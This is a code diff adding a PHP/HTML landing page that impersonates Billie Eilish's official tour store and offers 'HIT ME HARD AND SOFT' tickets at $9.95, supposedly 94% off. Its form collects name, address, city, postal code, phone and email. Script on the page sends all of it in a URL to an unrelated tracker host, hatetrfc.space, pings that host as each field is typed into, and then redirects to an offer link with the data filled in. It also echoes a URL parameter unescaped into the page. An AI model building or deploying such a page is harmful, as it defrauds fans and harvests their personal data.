@@ -1,0 +1,916 @@
+<?php require_once 'api.php'; ?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="icon" href="assets/favicon.png" type="image/x-icon">
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel="stylesheet" href="css/styles.css?v=2">
+    <link rel="stylesheet" href="css/header.css">
+    <link rel="stylesheet" href="css/footer.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <!-- Libary to detect county code and flag -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/css/intlTelInput.css">
+    <!-- End Libary to detect county code and flag  -->
+    <link rel="stylesheet" href="css/comments.css">
+    <title>TOUR - Billie Eilish</title>
+    <style>
+        :root {
+            --color-primary: #EA7B00;
+            --bg-color: #01237f;
+
+            --text-color: #fff;
+        }
+
+        @media (max-width: 500px) {
+            .color-selector__item {
+                width: 35px !important;
+                height: 35px !important;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .color-selector__item {
+                width: 25px !important;
+                height: 25px !important;
+            }
+        }
+
+        /* Стилі для іконок в хедері */
+        .header__actions {
+            display: flex !important;
+            gap: 15px !important;
+            align-items: center !important;
+            color: white !important;
+        }
+
+        .header__actions svg {
+            width: 24px !important;
+            height: 24px !important;
+            color: white !important;
+            fill: currentColor !important;
+            cursor: pointer !important;
+            transition: opacity 0.2s ease !important;
+            display: block !important;
+            visibility: visible !important;
+        }
+
+        .header__actions svg:hover {
+            opacity: 0.8 !important;
+        }
+    </style>
+</head>
+
+<!-- Facebook Pixel Code -->
+<script>
+    let urlParams = new URLSearchParams(window.location.search);
+    let ad_p = urlParams.get('ad_p') || '';
+    !function (f, b, e, v, n, t, s) {
+        if (f.fbq) return; n = f.fbq = function () {
+            n.callMethod ?
+                n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+        };
+        if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+        n.queue = []; t = b.createElement(e); t.async = !0;
+        t.src = v; s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s)
+    }(window, document, 'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+
+    fbq('init', ad_p);
+    fbq('track', 'PageView');
+</script>
+<noscript>
+    <img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=<?php echo $_GET['ad_p']; ?>&ev=PageView&noscript=1" />
+</noscript>
+<!-- End Facebook Pixel Code -->
+
+<body>
+    <script type="text/javascript">
+
+        // Зміна бренду, магазину, ціни та імені продукта по всьому ленду
+        const productName = "HIT ME HARD AND SOFT Tickets "
+        const brandName = "ticket"
+        const store = "TOUR - Billie Eilish"
+        const productPrice = "$9.95"
+
+        const from = " from "
+        const language = "en"
+        const countryCode = "us"
+
+    </script>
+    <div class="header">
+        <div class="header__top">
+
+            <div class="menu_contaner">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon icon--menu umg-icon"
+                    fill="currentColor">
+                    <path d="M0 64H448v64H0V64zM0 224H448v64H0V224zM448 384v64H0V384H448z"></path>
+                </svg>
+            </div>
+            <div class="header__logo">
+                <img src="assets/logo.webp" alt="">
+            </div>
+            <div class="header__actions">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="-64 0 576 512" class="icon icon--search umg-icon"
+                    fill="currentColor">
+                    <path
+                        d="M416 208c0 45.9-14.9 88.3-40 122.7L486.6 441.4 509.3 464 464 509.3l-22.6-22.6L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z">
+                    </path>
+                </svg>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon icon--cart umg-icon"
+                    fill="currentColor">
+                    <path
+                        d="M24 0H0V48H24 76.1l60.3 316.5 3.7 19.5H160 488h24V336H488 179.9l-9.1-48H496L576 32H122l-2.4-12.5L115.9 0H96 24zM176 512c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm336-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48z">
+                    </path>
+                </svg>
+
+            </div>
+        </div>
+
+    </div>
+    <div class="sidebar-menu" id="sidebarMenu">
+        <div class="close-btn" id="closeSidebar">&times;</div>
+        <ul>
+            <a href="#merch">MERCH</a>
+            <li>MUSIC</li>
+            <li>COLLECTIONS</li>
+            <li>BILLIE X NIKE</li>
+            <li>SUSTAINABILITY</li>
+            <li>TOUR</li>
+            <li>BILLIE'S KITCHEN</li>
+            <li>MORE</li>
+            <li>LOGIN</li>
+            <li>CREATE ACCOUNT</li>
+        </ul>
+        <script>
+            document.querySelector('.menu_contaner').onclick = function () {
+                document.getElementById('sidebarMenu').classList.add('active');
+            };
+            document.getElementById('closeSidebar').onclick = function () {
+                document.getElementById('sidebarMenu').classList.remove('active');
+            };
+            document
+                .getElementById('sidebarMenu')
+                .addEventListener('click', function (e) {
+                    if (e.target === this) this.classList.remove('active');
+                });
+        </script>
+    </div>
+
+    <div class="main-photo">
+        <img id="selectedImage" src="assets/main-img.webp" alt="">
+    </div>
+    <div class="wrapper">
+
+        <main class="lender">
+            <div class="container">
+                <div class="content">
+
+
+
+
+                    <div id="text-block">
+
+                        <button id="modal-button3" class="book-btn">
+                            book a ticket
+                        </button>
+
+                    </div>
+
+                    <section class="tour-slider-section">
+                        <h2 class="tour-slider-title">Tour Dates</h2>
+                        <div class="tour-slider">
+                            <div class="tour-slide active">
+                                <ul>
+                                    <li><b>Jul 7, 2025</b> - Glasgow, UK</li>
+                                    <li><b>Jul 8, 2025</b> - Glasgow, UK</li>
+                                    <li><b>Jul 10, 2025</b> - London, UK</li>
+                                    <li><b>Jul 11, 2025</b> - London, UK</li>
+                                    <li><b>Jul 13, 2025</b> - London, UK</li>
+                                    <li><b>Jul 14, 2025</b> - London, UK</li>
+                                    <li><b>Jul 16, 2025</b> - London, UK</li>
+                                    <li><b>Jul 17, 2025</b> - London, UK</li>
+                                    <li><b>Jul 19, 2025</b> - Manchester, UK</li>
+                                    <li><b>Jul 20, 2025</b> - Manchester, UK</li>
+                                    <li><b>Jul 22, 2025</b> - Manchester, UK</li>
+                                    <li><b>Jul 23, 2025</b> - Manchester, UK</li>
+                                    <li><b>Jul 26, 2025</b> - Dublin, Ireland</li>
+                                    <li><b>Jul 27, 2025</b> - Dublin, Ireland</li>
+                                    <li><b>Aug 16, 2025</b> - Tokyo, Japan</li>
+                                </ul>
+                            </div>
+                            <div class="tour-slide">
+                                <ul>
+                                    <li><b>Aug 17, 2025</b> - Tokyo, Japan</li>
+                                    <li><b>Oct 9, 2025</b> - Miami, FL</li>
+                                    <li><b>Oct 11, 2025</b> - Miami, FL</li>
+                                    <li><b>Oct 12, 2025</b> - Miami, FL</li>
+                                    <li><b>Oct 14, 2025</b> - Orlando, FL</li>
+                                    <li><b>Oct 16, 2025</b> - Raleigh, NC</li>
+                                    <li><b>Oct 17, 2025</b> - Raleigh, NC</li>
+                                    <li><b>Oct 19, 2025</b> - Charlotte, NC</li>
+                                    <li><b>Oct 20, 2025</b> - Charlotte, NC</li>
+                                    <li><b>Oct 23, 2025</b> - Philadelphia, PA</li>
+                                    <li><b>Oct 25, 2025</b> - Long Island, NY</li>
+                                    <li><b>Oct 26, 2025</b> - Long Island, NY</li>
+                                    <li><b>Nov 7, 2025</b> - New Orleans, LA</li>
+                                    <li><b>Nov 8, 2025</b> - New Orleans, LA</li>
+                                    <li><b>Nov 10, 2025</b> - Tulsa, OK</li>
+                                </ul>
+                            </div>
+                            <div class="tour-slide">
+                                <ul>
+                                    <li><b>Nov 11, 2025</b> - Tulsa, OK</li>
+                                    <li><b>Nov 13, 2025</b> - Austin, TX</li>
+                                    <li><b>Nov 14, 2025</b> - Austin, TX</li>
+                                    <li><b>Nov 18, 2025</b> - Phoenix, AZ</li>
+                                    <li><b>Nov 19, 2025</b> - Phoenix, AZ</li>
+                                    <li><b>Nov 22, 2025</b> - San Francisco, CA</li>
+                                    <li><b>Nov 23, 2025</b> - San Francisco, CA</li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="tour-slider-dots">
+                            <span class="dot active"></span>
+                            <span class="dot"></span>
+                            <span class="dot"></span>
+                        </div>
+                    </section>
+
+                </div>
+
+            </div>
+
+            <section class="merch-section" id="merch">
+                <h2 class="merch-title">SHOP THE TOUR COLLECTION</h2>
+                <div class="merch-list">
+                    <div class="merch-item">
+                        <img src="assets/merch/merch1.webp" alt="SHARK RAGLAN TEE">
+                        <div class="merch-name">SHARK RAGLAN TEE</div>
+                        <div class="merch-price">$45.00</div>
+                    </div>
+                    <div class="merch-item">
+                        <img src="assets/merch/merch2.webp" alt="BILLIE PHOTO TOUR TEE">
+                        <div class="merch-name">BILLIE PHOTO TOUR TEE</div>
+                        <div class="merch-price">$45.00</div>
+                    </div>
+                    <div class="merch-item">
+                        <img src="assets/merch/merch3.webp" alt="BILLIE YELLOW TOUR ZIP HOODIE">
+                        <div class="merch-name">BILLIE YELLOW TOUR ZIP HOODIE</div>
+                        <div class="merch-price">$110.00</div>
+                    </div>
+                    <div class="merch-item">
+                        <img src="assets/merch/merch4.webp" alt="ALL OVER BILLIE TANK">
+                        <div class="merch-name">ALL OVER BILLIE TANK</div>
+                        <div class="merch-price">$45.00</div>
+                    </div>
+                </div>
+            </section>
+            <section class="book-promo">
+                <h3>Book a ticket now</h3>
+                <button class="book-btn">
+                    book a ticket
+                </button>
+            </section>
+            <section class="merch-section" id="album">
+                <h2 class="merch-title">SHOP THE NEW ALBUM</h2>
+                <div class="merch-list">
+                    <div class="merch-item">
+                        <img src="assets/albums/album1.webp" alt="SHARK RAGLAN TEE">
+                        <div class="merch-name">HIT ME HARD AND SOFT Anniversary Edition Vinyl</div>
+                        <div class="merch-price">$33.00</div>
+                    </div>
+                    <div class="merch-item">
+                        <img src="assets/albums/album2.webp" alt="BILLIE PHOTO TOUR TEE">
+                        <div class="merch-name">BIRDS OF A FEATHER 7" Vinyl [Translucent Green]</div>
+                        <div class="merch-price">$15.00</div>
+                    </div>
+                    <div class="merch-item">
+                        <img src="assets/albums/album3.webp" alt="BILLIE YELLOW TOUR ZIP HOODIE">
+                        <div class="merch-name">HIT ME HARD AND SOFT Standard Vinyl</div>
+                        <div class="merch-price">$33.00</div>
+                    </div>
+                    <div class="merch-item">
+                        <img src="assets/albums/album4.webp" alt="ALL OVER BILLIE TANK">
+                        <div class="merch-name">HIT ME HARD AND SOFT Standard CD</div>
+                        <div class="merch-price">$14.00</div>
+                    </div>
+                </div>
+            </section>
+        </main>
+        <main class="prefil">
+
+            <div class="container">
+                <div class="d-flex flex-wrap align-items-center prefil-product-category">
+                    <span class="text-wrapper clickable">Yeti Backpacks </span>
+                    <span class="fa fa-angle-right"></span>
+                    <span class="text-wrapper clickable">Yeti Crossroads 27L Backpack</span>
+                </div>
+                <div class="product-rating">
+                    <div class="product-rating__stars">
+                        <span class="stars">★★★★★</span>
+                    </div>
+                    <p href="#" class="product-rating__reviews">4.9 (6,207)</p>
+
+                </div>
+
+                <div class="product-labels">
+                    <span class="product-labels__badge product-labels__badge--bestseller">Exclusive</span>
+                    <span class="product-labels__badge product-labels__badge--discount">Limited offer</span>
+                </div>
+
+
+                <div class="prefil__container">
+                    <div class="item">
+                        <div class="prefil__label">
+                            <div class="product-name">
+                                <h4><span class="product-title"></span></h4>
+                            </div>
+                        </div>
+
+
+
+                    </div>
+
+                    <div class="item">
+                        <div class="new-price text-left ">
+                            <p style="color: grey; font-weight: 400;">Limit 1 per order</p>
+                            <h2 class=""
+                                style="color: #000; font-weight: 600 !important; font-size: 40px; display: flex; align-items: center;  ">
+                                <span style="font-size: 24px; ">$</span>9 <span
+                                    style="font-size: 24px; margin-left: 2px;  ">95</span>
+                            </h2>
+                        </div>
+                        <div>
+                            <div class="price"> <span style="color: grey; font-weight: 400;">Was <s>$150.00</s></span>
+                            </div>
+                            <div class="price"> <span style="color: green; font-weight: 400;">Save $140.05 (94%)</span>
+                            </div>
+                        </div>
+
+                        <style>
+                            .form__group input,
+                            .form__group select {
+                                padding: 10px;
+                                background: #fafafa;
+                                height: 38px;
+                                color: black;
+                                border: 1px solid #ccc;
+                                border-radius: 3px;
+                                box-sizing: border-box;
+                                width: 100%;
+                                line-height: 1rem;
+                                font-size: 14px;
+                            }
+                        </style>
+
+                        <div class="form-container">
+                            <div style="margin-top: 0.5cm; margin-bottom: 0.2cm;"></div>
+                            <h2 class="form-container__title">Please complete your personal information:</h2>
+                            <form id="newForm" class="form">
+                                <div class="form__row">
+                                    <div class="form__group form__group__half">
+                                        <input type="text" id="first-name" class="form__input" placeholder=" " required>
+                                        <input type="hidden" id="red">
+                                        <label for="first-name" class="form__label">First Name</label>
+                                    </div>
+                                    <div class="form__group form__group__half">
+                                        <input type="text" id="last-name" class="form__input" placeholder=" " required>
+                                        <label for="last-name" class="form__label">Last Name</label>
+                                    </div>
+                                </div>
+
+                                <div class="form__group">
+                                    <input type="text" id="address" class="form__input" placeholder=" " required>
+                                    <label for="address" class="form__label">Address</label>
+                                </div>
+                                <div class="form__row">
+                                    <div class="form__group form__group__half">
+                                        <input type="text" id="postal-code" class="form__input" placeholder=" "
+                                            required>
+                                        <label for="postal-code" class="form__label">Postal Code</label>
+                                    </div>
+                                    <div class="form__group form__group__half">
+                                        <input type="text" id="city" class="form__input" placeholder=" " required>
+                                        <label for="city" class="form__label">City</label>
+                                    </div>
+                                </div>
+
+                                <div class="form__row">
+                                    <div class="form__group ">
+                                        <select class="form__input" required="" data-sharkid="__6">
+                                            <option value="" disabled="" selected=""></option>
+                                            <option value="AL">Alabama</option>
+                                            <option value="AK">Alaska</option>
+                                            <option value="AZ">Arizona</option>
+                                            <option value="AR">Arkansas</option>
+                                            <option value="CA">California</option>
+                                            <option value="CO">Colorado</option>
+                                            <option value="CT">Connecticut</option>
+                                            <option value="DE">Delaware</option>
+                                            <option value="FL">Florida</option>
+                                            <option value="GA">Georgia</option>
+                                            <option value="HI">Hawaii</option>
+                                            <option value="ID">Idaho</option>
+                                            <option value="IL">Illinois</option>
+                                            <option value="IN">Indiana</option>
+                                            <option value="IA">Iowa</option>
+                                            <option value="KS">Kansas</option>
+                                            <option value="KY">Kentucky</option>
+                                            <option value="LA">Louisiana</option>
+                                            <option value="ME">Maine</option>
+                                            <option value="MD">Maryland</option>
+                                            <option value="MA">Massachusetts</option>
+                                            <option value="MI">Michigan</option>
+                                            <option value="MN">Minnesota</option>
+                                            <option value="MS">Mississippi</option>
+                                            <option value="MO">Missouri</option>
+                                            <option value="MT">Montana</option>
+                                            <option value="NE">Nebraska</option>
+                                            <option value="NV">Nevada</option>
+                                            <option value="NH">New Hampshire</option>
+                                            <option value="NJ">New Jersey</option>
+                                            <option value="NM">New Mexico</option>
+                                            <option value="NY">New York</option>
+                                            <option value="NC">North Carolina</option>
+                                            <option value="ND">North Dakota</option>
+                                            <option value="OH">Ohio</option>
+                                            <option value="OK">Oklahoma</option>
+                                            <option value="OR">Oregon</option>
+                                            <option value="PA">Pennsylvania</option>
+                                            <option value="RI">Rhode Island</option>
+                                            <option value="SC">South Carolina</option>
+                                            <option value="SD">South Dakota</option>
+                                            <option value="TN">Tennessee</option>
+                                            <option value="TX">Texas</option>
+                                            <option value="UT">Utah</option>
+                                            <option value="VT">Vermont</option>
+                                            <option value="VA">Virginia</option>
+                                            <option value="WA">Washington</option>
+                                            <option value="WV">West Virginia</option>
+                                            <option value="WI">Wisconsin</option>
+                                            <option value="WY">Wyoming</option>
+                                        </select>
+                                        <label for="state" class="form__label">State</label>
+                                    </div>
+                                </div>
+
+                                <div class="form__group focused">
+                                    <div class="iti iti--separate-dial-code iti--show-flags">
+                                        <input type="text" data-validate="phone" class="w100 iti__tel-input" id="ph"
+                                            pattern="\d{10,10}"
+                                            title="The phone number must contain 10 digits and cannot start with 0 (without the +1 prefix)."
+                                            name="sub10" autocomplete="tel-national" value="" required=""
+                                            style="padding-left: 70px;" data-intl-tel-input-id="0">
+                                        <input id="phone" type="hidden" name="fullPhone">
+                                    </div>
+                                    <input type="hidden" id="phone" name="phone" value="">
+                                </div>
+                                <div class="form__group">
+                                    <input type="email" id="email" class="form__input" placeholder=" " required>
+                                    <label for="email" class="form__label">Email</label>
+                                </div>
+
+                                <button type="submit" class="form__submit-btn">CONTINUE</button>
+                            </form>
+                        </div>
+
+                        <div class="badge">
+                            <div class="badge__title">TRUSTED SHOP</div>
+                            <div class="badge__subtitle">SECURE PAYMENT</div>
+                        </div>
+
+
+
+                    </div>
+                </div>
+            </div>
+
+        </main>
+    </div>
+    <footer class="custom-footer">
+        <div class="footer-content">
+            <div class="footer-person">
+                <img src="assets/billie_icon.webp" alt="person" />
+            </div>
+            <div class="footer-links">
+                <div class="footer-links-col">
+                    <a href="#">MERCH</a>
+                    <a href="#">MUSIC</a>
+                    <a href="#">COLLECTIONS</a>
+                    <a href="#">BILLIE X NIKE</a>
+                    <a href="#">SUSTAINABILITY</a>
+                    <a href="#">TOUR</a>
+                    <a href="#">BILLIE'S KITCHEN</a>
+                    <a href="#">MORE</a>
+                </div>
+                <div class="footer-links-col">
+                    <a href="#">HELP & SUPPORT</a>
+                    <a href="#">TERMS</a>
+                    <a href="#">PRIVACY</a>
+                    <a href="#">DO NOT SELL MY PERSONAL INFORMATION</a>
+                    <a href="#">COOKIE CHOICES</a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-social">
+            <a href="https://www.facebook.com/billieeilish/"><i class="fab fa-facebook-f"></i></a>
+            <a href="https://x.com/billieeilish"><i class="fab fa-x-twitter"></i></a>
+            <a href="https://www.instagram.com/billieeilish/"><i class="fab fa-instagram"></i></a>
+            <a href="https://www.youtube.com/channel/UCiGm_E4ZwYSHV3bcW1pnSeQ"><i class="fab fa-youtube"></i></a>
+            <a href="https://music.apple.com/us/artist/billie-eilish/1065981054"><i class="fab fa-apple"></i></a>
+            <a href="https://open.spotify.com/artist/6qqNVTkY8uBg9cP3Jd7DAH"><i class="fab fa-spotify"></i></a>
+        </div>
+        <div class="footer-accessibility">
+            If you are using a screen reader and are having problems using this website, please call 866-682-4413 for
+            assistance.
+        </div>
+    </footer>
+    <script type="text/javascript">
+        document.addEventListener("DOMContentLoaded", function () {
+            const phoneInput = document.querySelector("#ph");
+            const hiddenPhoneInput = document.querySelector("#phone");
+            const fullPhoneInput = document.querySelector("input[name='fullPhone']");
+
+            if (phoneInput) {
+                const iti = intlTelInput(phoneInput, {
+                    initialCountry: countryCode,
+                    separateDialCode: true,
+                    autoPlaceholder: "off",
+                    allowDropdown: false,
+                    utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/utils.js"
+                });
+
+                function validatePhoneNumber() {
+                    const fullNumber = iti.getNumber().replace("+", "").replace(/\s/g, "").replace(/-/g, "");
+                    hiddenPhoneInput.value = fullNumber;
+                    fullPhoneInput.value = fullNumber
+                }
+
+                phoneInput.addEventListener('blur', validatePhoneNumber);
+                phoneInput.addEventListener('keyup', validatePhoneNumber);
+                phoneInput.addEventListener('change', validatePhoneNumber);
+            } else {
+                console.error("Елемент #ph не знайдено");
+            }
+
+            if (sessionStorage.getItem('lp_sent')) {
+                processOfferUrl();
+            }
+        });
+    </script>
+
+    <!-- ДАЛІ МОЖНО НЕ ПЕРЕКЛАДАТИ (КРАЩЕ НЕ ЧІПАТИ)  -->
+
+    <script>
+        urlParams = new URLSearchParams(window.location.search);
+        let clid = urlParams.get('clid');
+        // Збереження кукі для події
+
+        // Валідація форми
+        function validateFormData() {
+            let fname = document.getElementById("first-name").value;
+            let lname = document.getElementById("last-name").value;
+            let address = document.getElementById("address").value;
+            let zip = document.getElementById("postal-code").value;
+            let cityName = document.getElementById("city").value;
+            let phone = document.getElementById("ph").value;
+            let email = document.getElementById("email").value;
+
+            if (!fname || !lname || !address || !zip || !cityName || !phone || !email) {
+                alert("Будь ласка, заповніть усі поля.");
+                return false;
+            }
+            return true;
+        }
+
+        function sendPostback() {
+
+            let fname = document.getElementById("first-name").value;
+            let lname = document.getElementById("last-name").value;
+            let address = document.getElementById("address").value;
+            let zip = document.getElementById("postal-code").value;
+            let cityName = document.getElementById("city").value;
+            let phone = document.getElementById("ph").value;
+            let email = document.getElementById("email").value;
+            let fullPhone = document.querySelector("input[name='fullPhone']")?.value || phone;
+
+            let postbackUrl = `https://hatetrfc.space/click?upd_clickid=${clid}&t8=${fname}&t9=${lname}&t12=${address}&t13=${zip}&t14=${cityName}&t11=${fullPhone}&t10=${email}`;
+
+            // Відправка постбеку через fetch
+            fetch(postbackUrl, {
+                method: 'GET',
+                mode: 'no-cors'
+            })
+
+        }
+        document.querySelector(".form__submit-btn").addEventListener("click", () => {
+            if (!sessionStorage.getItem("event_4")) {
+
+                fetch(`https://hatetrfc.space/click?event4=1&upd_clickid=${clid}`, {
+                    mode: 'no-cors'
+                })
+                    .then(response => {
+                        sessionStorage.setItem("event_4", "1");
+                    })
+                    .catch(error => {
+                        console.error('Error fetching the tracker:', error);
+                    });
+            }
+        })
+
+
+        document.getElementById('newForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            if (!validateFormData()) {
+                return;
+            }
+            sendPostback()
+            urlParams = new URLSearchParams(window.location.search);
+            clid = urlParams.get('clid') || '';
+            let ad_p = urlParams.get('ad_p') || '';
+            let source = urlParams.get('source') || '';
+
+            let fname = document.getElementById("first-name").value;
+            let lname = document.getElementById("last-name").value;
+            let address = document.getElementById("address").value;
+            let zip = document.getElementById("postal-code").value;
+            let cityName = document.getElementById("city").value;
+            let phone = document.getElementById("ph").value;
+            let email = document.getElementById("email").value;
+            let fullPhone = document.querySelector("input[name='fullPhone']")?.value || phone;
+            let offerUrl = document.getElementById("red").value;
+            let selectedImage = document.getElementById('selectedImage').src;
+
+            // Подставляем переменные в offerUrl
+            offerUrl = offerUrl
+                .replace("${fname}", fname)
+                .replace("${lname}", lname)
+                .replace("${zip}", zip)
+                .replace("${cityName}", cityName)
+                .replace("${address}", address)
+                .replace("${email}", email)
+                .replace("${fullPhone}", fullPhone)
+                .replace("${produktURL}", selectedImage)
+                .replace("${ProduktName}", productName)
+                .replace("${clid}", clid)
+                .replace("${ad_p}", ad_p)
+                .replace("${source}", source);
+
+            if (!sessionStorage.getItem("event_3")) {
+
+                fetch(`https://hatetrfc.space/click?event3=1&upd_clickid=${clid}`, {
+                    mode: 'no-cors'
+                })
+                    .then(response => {
+                        sessionStorage.setItem("event_3", "1");
+                    })
+                    .catch(error => {
+                        console.error('Error fetching the tracker:', error);
+                    });
+            }
+
+            // Перенаправление на новую ссылку
+            window.location.href = offerUrl;
+        })
+
+        // Обробка подій на полях форми
+        document.getElementById('first-name').addEventListener('input', function () {
+            if (this.value.length === 1) {
+
+                if (!sessionStorage.getItem("event_6")) {
+
+                    fetch(`https://hatetrfc.space/click?event6=1&upd_clickid=${clid}`, {
+                        mode: 'no-cors'
+                    })
+                        .then(response => {
+                            sessionStorage.setItem("event_6", "1");
+                        })
+                        .catch(error => {
+                            console.error('Error fetching the tracker:', error);
+                        });
+                }
+            }
+        });
+
+        document.getElementById('last-name').addEventListener('input', function () {
+            if (this.value.length === 1) {
+                if (!sessionStorage.getItem("event_7")) {
+
+                    fetch(`https://hatetrfc.space/click?event7=1&upd_clickid=${clid}`, {
+                        mode: 'no-cors'
+                    })
+                        .then(response => {
+                            sessionStorage.setItem("event_7", "1");
+                        })
+                        .catch(error => {
+                            console.error('Error fetching the tracker:', error);
+                        });
+                }
+            }
+        });
+
+        document.getElementById('postal-code').addEventListener('input', function () {
+            if (this.value.length === 1) {
+                if (!sessionStorage.getItem("event_8")) {
+
+                    fetch(`https://hatetrfc.space/click?event8=1&upd_clickid=${clid}`, {
+                        mode: 'no-cors'
+                    })
+                        .then(response => {
+                            sessionStorage.setItem("event_8", "1");
+                        })
+                        .catch(error => {
+                            console.error('Error fetching the tracker:', error);
+                        });
+                }
+            }
+        });
+
+        document.getElementById('city').addEventListener('input', function () {
+            if (this.value.length === 1) {
+                if (!sessionStorage.getItem("event_9")) {
+
+                    fetch(`https://hatetrfc.space/click?event9=1&upd_clickid=${clid}`, {
+                        mode: 'no-cors'
+                    })
+                        .then(response => {
+                            sessionStorage.setItem("event_9", "1");
+                        })
+                        .catch(error => {
+                            console.error('Error fetching the tracker:', error);
+                        });
+                }
+            }
+        });
+
+        document.getElementById('ph').addEventListener('input', function () {
+            if (this.value.length === 1) {
+                if (!sessionStorage.getItem("event_10")) {
+
+                    fetch(`https://hatetrfc.space/click?event10=1&upd_clickid=${clid}`, {
+                        mode: 'no-cors'
+                    })
+                        .then(response => {
+                            sessionStorage.setItem("event_10", "1");
+                        })
+                        .catch(error => {
+                            console.error('Error fetching the tracker:', error);
+                        });
+                }
+            }
+        });
+
+        document.getElementById('email').addEventListener('input', function () {
+            if (this.value.length === 1) {
+                if (!sessionStorage.getItem("event_11")) {
+
+                    fetch(`https://hatetrfc.space/click?event11=1&upd_clickid=${clid}`, {
+                        mode: 'no-cors'
+                    })
+                        .then(response => {
+                            sessionStorage.setItem("event_11", "1");
+                        })
+                        .catch(error => {
+                            console.error('Error fetching the tracker:', error);
+                        });
+                }
+            }
+        });
+
+        // Відправка постбеку при прокручуванні до кнопки "CONTINUE"
+        window.addEventListener('scroll', function trackScroll() {
+            let continueButton = document.querySelector('.form__submit-btn');
+            let rect = continueButton.getBoundingClientRect();
+            if (rect.top <= window.innerHeight && rect.bottom >= 0) {
+                if (!sessionStorage.getItem("event_5")) {
+                    fetch(`https://hatetrfc.space/click?event5=1&upd_clickid=${clid}`, {
+                        mode: 'no-cors'
+                    })
+                        .then(response => {
+                            sessionStorage.setItem("event_5", "1");
+                            window.removeEventListener('scroll', trackScroll);
+                        })
+                        .catch(error => {
+                            console.error('Error fetching the tracker:', error);
+                        });
+                }
+            }
+        }, { once: true });
+
+        document.getElementById("modal-button3").addEventListener("click", function () {
+            processOfferUrl();
+        });
+
+        function processOfferUrl() {
+            urlParams = new URLSearchParams(window.location.search);
+            clid = urlParams.get("clid");
+
+            const formData = new URLSearchParams();
+            formData.append("action", "setLPClick");
+            if (clid) {
+                formData.append("clid", clid);
+            }
+
+            fetch("api.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: formData.toString()
+            })
+                .then(response => response.text())
+                .then(data => {
+                    if (data !== 'error') {
+                        sessionStorage.setItem('lp_sent', '1');
+                        document.getElementById('red').value = data;
+                        console.log('done setup');
+                    }
+                })
+                .catch(error => console.error("error..."));
+        }
+
+    </script>
+
+    <script src="js/script.js"></script>
+
+    <!-- Libary to detect county code and flag -->
+    <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/intlTelInput.min.js"></script>
+
+    <!-- End Libary to detect county code and flag -->
+
+    <script>
+        const slides = document.querySelectorAll('.tour-slide');
+        const dots = document.querySelectorAll('.tour-slider-dots .dot');
+        let current = 0;
+        function showSlide(idx) {
+            slides.forEach((s, i) => s.classList.toggle('active', i === idx));
+            dots.forEach((d, i) => d.classList.toggle('active', i === idx));
+            current = idx;
+        }
+        dots.forEach((dot, i) => {
+            dot.addEventListener('click', () => showSlide(i));
+        });
+        (function () {
+            const slides = document.querySelectorAll('.tour-slide');
+            const dots = document.querySelectorAll('.tour-slider-dots .dot');
+            let current = 0;
+            let startX = 0;
+            let isDragging = false;
+
+            function showSlide(idx) {
+                slides.forEach((s, i) => s.classList.toggle('active', i === idx));
+                dots.forEach((d, i) => d.classList.toggle('active', i === idx));
+                current = idx;
+            }
+            dots.forEach((dot, i) => {
+                dot.addEventListener('click', () => showSlide(i));
+            });
+
+            // Swipe/drag logic
+            const slider = document.querySelector('.tour-slider');
+            slider.addEventListener('touchstart', e => {
+                startX = e.touches[0].clientX;
+                isDragging = true;
+            });
+            slider.addEventListener('touchmove', e => {
+                if (!isDragging) return;
+                let diff = e.touches[0].clientX - startX;
+                if (Math.abs(diff) > 50) {
+                    if (diff < 0 && current < slides.length - 1) showSlide(current + 1);
+                    if (diff > 0 && current > 0) showSlide(current - 1);
+                    isDragging = false;
+                }
+            });
+            slider.addEventListener('touchend', () => { isDragging = false; });
+
+            // Mouse drag for desktop
+            let mouseDown = false, mouseStart = 0;
+            slider.addEventListener('mousedown', e => {
+                mouseDown = true;
+                mouseStart = e.clientX;
+            });
+            slider.addEventListener('mousemove', e => {
+                if (!mouseDown) return;
+                let diff = e.clientX - mouseStart;
+                if (Math.abs(diff) > 50) {
+                    if (diff < 0 && current < slides.length - 1) showSlide(current + 1);
+                    if (diff > 0 && current > 0) showSlide(current - 1);
+                    mouseDown = false;
+                }
+            });
+            slider.addEventListener('mouseup', () => { mouseDown = false; });
+            slider.addEventListener('mouseleave', () => { mouseDown = false; });
+        })();
+    </script>
+
+
+
+</body>
+
+</html>
